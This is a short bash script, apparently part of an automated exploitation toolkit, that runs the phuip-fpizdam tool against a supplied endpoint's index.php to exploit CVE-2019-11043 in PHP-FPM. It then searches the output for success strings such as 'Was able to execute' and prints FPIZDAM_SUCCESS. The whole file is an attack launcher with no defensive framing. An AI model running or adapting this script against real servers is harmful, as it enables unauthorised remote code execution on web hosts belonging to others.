#!/bin/bash
# PHP-FPM — Run phuip-fpizdam for CVE-2019-11043 exploitation
# Usage: run_fpizdam.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"

echo "[*] phuip-fpizdam 注入..."
output=$(phuip-fpizdam "${ENDPOINT}/index.php" 2>&1)
echo "$output"
if echo "$output" | grep -qi "Success\|Attack params found\|Was able to execute"; then
  echo "FPIZDAM_SUCCESS"
fi
